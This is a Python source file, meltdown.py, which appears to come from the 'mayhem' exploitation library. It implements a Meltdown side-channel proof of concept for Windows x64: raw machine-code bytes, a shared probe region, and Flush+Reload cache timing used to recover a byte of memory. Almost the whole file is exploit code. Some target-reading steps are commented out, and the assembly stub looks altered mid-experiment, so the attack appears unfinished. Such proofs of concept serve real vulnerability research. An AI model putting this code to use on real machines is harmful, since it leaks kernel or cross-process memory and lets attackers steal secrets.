#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  meltdown.py
#
#  Copyright 2018 Spencer McIntyre <zeroSteiner@gmail.com>
#
#  Redistribution and use in source and binary forms, with or without
#  modification, are permitted provided that the following conditions are
#  met:
#
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above
#    copyright notice, this list of conditions and the following disclaimer
#    in the documentation and/or other materials provided with the
#    distribution.
#  * Neither the name of the  nor the names of its
#    contributors may be used to endorse or promote products derived from
#    this software without specific prior written permission.
#
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#

import ast
import ctypes
import os
import subprocess
import sys
import time

mayhem_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, mayhem_path)

import mayhem.datatypes.windows
import mayhem.exploit.windows

system_info = mayhem.datatypes.windows.SYSTEM_INFO.from_kernel32()
FILE_MAP_READ = 4
PAGE_READWRITE = 4
PAGE_SIZE = system_info.dwPageSize
PROBE_REGION_SIZE = 256 * PAGE_SIZE

class MeltdownProbe(mayhem.exploit.windows.WindowsAsmFunctionBase):
	_asm_function_prototype = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_uint64, ctypes.c_uint64)
	_asm_function_stub  = b'\x48\x31\xc0'      # xor  rax, rax
	#_asm_function_stub += b'\x8a\x01'          # mov  al, BYTE PTR [rcx]
	_asm_function_stub += b'\xb8\xf0\x00\x00\x00'
	_asm_function_stub += b'\x48\xc1\xe0\x0c'  # shl  rax, 0x0c
	_asm_function_stub += b'\x74\xf8'          # je   loc_00000000
	_asm_function_stub += b'\x48\x8b\x14\x02'
	_asm_function_stub += b'\xc3'                  # ret

flush_reload = mayhem.exploit.windows.WindowsX64FlushReload()
prober = MeltdownProbe()

def execute_python(code):
	os.environ['PYTHONPATH'] = os.path.dirname(__file__)
	proc_h = subprocess.Popen(
		[sys.executable, '-c', code],
		env=os.environ,
		stdin=subprocess.PIPE,
		#stdout=subprocess.PIPE,
		#stderr=subprocess.PIPE
	)
	return proc_h

def get_probe_region():
	k32 = ctypes.windll.kernel32
	k32.CreateFileMappingA.restype = ctypes.c_void_p
	handle = k32.CreateFileMappingA(-1, None, PAGE_READWRITE, 0, PROBE_REGION_SIZE, b'Meltdown\x00')
	if not handle:
		raise RuntimeError("CreateFileMapping failed (last error: 0x{0:08x}".format(k32.GetLastError()))
	k32.MapViewOfFile.restype = ctypes.c_void_p
	address = k32.MapViewOfFile(handle, FILE_MAP_READ, 0, 0, 0)
	if not address:
		raise RuntimeError("MapViewOfFile failed (last error: 0x{0:08x}".format(k32.GetLastError()))
	return address

def probe_address(address):
	code = '; '.join((
		'import meltdown',
		"meltdown.probe_entry({0!r})".format(address)
	))
	return execute_python(code)

def probe_entry(target_address):
	probe_region = get_probe_region()
	time.sleep(0.2)
	#print("    probe region: 0x{0:016x}".format(probe_region))
	prober(target_address, probe_region)
	#print("    probe complete")

def get_byte(probe_region, threshold, timeout=0):
	end_time = time.time() + timeout
	while True:
		for address in range(probe_region + PAGE_SIZE, probe_region + PROBE_REGION_SIZE, PAGE_SIZE):
			cycles = flush_reload(address)
			if cycles < threshold:
				return int((address - probe_region) / PAGE_SIZE), cycles
		if time.time() > end_time:
			break
	return None

def main():
	probe_region = get_probe_region()
	print("[*] probe region: 0x{0:016x}".format(probe_region))
	get_byte(probe_region, threshold=float('-inf'))  # use -inf to force a Flush+Reload of all the addresses

	threshold = ast.literal_eval(sys.argv[1])
	#target_address = ast.literal_eval(sys.argv[2])
	#print("[*] reading from: {0:016x}".format(target_address))
	#proc_h = probe_address(target_address)
	result = get_byte(probe_region, threshold=threshold, timeout=8)
	if result is None:
		print('[-] failed to read data')
	else:
		print("[*] read 0x{0:02x} (cycles: {1})".format(result[0], result[1]))
	#proc_h.wait()

if __name__ == '__main__':
	main()
